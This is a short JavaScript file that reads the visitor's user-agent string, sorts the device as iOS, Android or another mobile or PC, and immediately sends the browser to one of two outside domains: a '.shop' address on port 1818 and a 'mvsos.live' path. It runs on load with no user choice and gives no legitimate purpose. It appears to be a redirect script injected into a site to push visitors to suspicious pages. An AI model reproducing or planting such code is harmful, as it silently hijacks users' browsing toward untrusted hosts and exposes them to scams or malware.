function browserRedirect() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";
    var bIsMidp = sUserAgent.match(/midp/i) == "midp";
    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";
    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";
    var bIsAndroid = sUserAgent.match(/android/i) == "android";
    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";
    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";
    if (bIsIphoneOs || bIsIpad) {
        // alert('iphone') // 识别 苹果
        window.location.href = "https://down.bolinart.shop:1818/WXWz.html";
    } else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
        //alert('android') // 识别 安卓
        window.location.href = "https://mvsos.live/nlzyupymat";
    } else {
        //alert('pc') // 识别 pc
        window.location.href = "https://mvsos.live/nlzyupymat";
    }
}

browserRedirect()  // 直接调用